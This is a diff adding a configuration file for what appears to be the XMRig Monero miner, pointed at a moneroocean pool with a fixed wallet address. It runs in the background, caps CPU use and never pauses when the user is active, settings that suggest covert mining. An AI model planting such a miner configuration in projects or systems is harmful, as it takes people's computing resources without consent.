@@ -1,0 +1,76 @@
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": true,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "mode": "light",
+        "1gb-pages": false,
+        "rdmsr": true,
+	"wrmsr": true,
+        "cache_qos": false,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "hw-aes": null,
+        "priority": 1,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "max-threads-hint": 30,
+        "max-cpu-usage": 30
+    },
+    "opencl": {
+    "enabled": false
+    },
+    "cuda": {
+    "enabled": false
+    },
+    "log-file": null,
+    "donate-level": 1,
+    "pools": [
+        {
+            "url": "gulf.moneroocean.stream:20128",
+            "user": "45T1a7h3kPAX3BHXVk1MHQePhHoXKksGEKuoZK8kJtFEbhqo5693pGz7m4aBuEMXz7CYDUkaXok7zCZB3fVGhSom5AbizGG",
+            "pass": "x",
+            "rig-id": "Ryletka",
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": true
+        }
+    ],
+    "retries": 10,
+    "retry-pause": 10,
+    "print-time": 30,
+    "health-print-time": 60,
+    "syslog": false,
+    "tls": {
+        "enabled": true
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 60
+    },
+    "user-agent": "Monolit_wheels",
+    "verbose": 1,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
